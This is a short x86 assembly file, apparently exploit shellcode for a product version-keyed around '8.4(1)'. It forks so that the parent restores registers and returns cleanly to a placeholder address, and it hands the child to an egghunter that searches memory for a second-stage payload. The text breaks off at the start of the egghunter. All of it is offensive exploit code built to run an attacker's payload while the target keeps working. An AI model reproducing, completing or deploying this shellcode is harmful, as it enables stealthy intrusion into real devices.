BITS 32

SAFERET_OFFSET  equ     0x11111111      ; where to continue execution
FIX_EBP         equ     0x48            ; this is 0x58 in versions before 8.4(1)
FIX_EDI         equ     0x0f0f0f0b      ; seems static?
FIX_EBX         equ     0x10            ; seems static?

_start:
    ; these are registers we have to clean up, so we can null them before save
    xor ebx, ebx
    xor esi, esi
    xor ecx, ecx                        ; ecx is volatile register
    xor eax, eax

    pusha                               ; save all registers

    ; fork, have parent return cleanly
    add al, 0x2
    int 0x80
    test eax, eax
    jz _egghunter

    popa                                ; restore all registers

    push SAFERET_OFFSET                 ; push the safe return address

    ; these registers are pre-xored
    add bl, FIX_EBX
    mov edi, FIX_EDI

    mov ebp, esp
    add ebp, FIX_EBP

    ret                                 ; return to safe address

_egghunter:
    mov ecx, esp
    xor cx, cx
